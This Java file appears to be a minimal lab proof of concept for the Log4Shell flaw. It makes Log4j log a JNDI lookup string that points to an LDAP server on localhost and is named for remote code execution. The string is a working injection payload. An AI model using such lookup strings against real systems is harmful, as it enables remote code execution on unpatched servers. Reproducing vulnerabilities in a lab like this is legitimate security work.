import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4j {
    private static final Logger logger = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
    }
}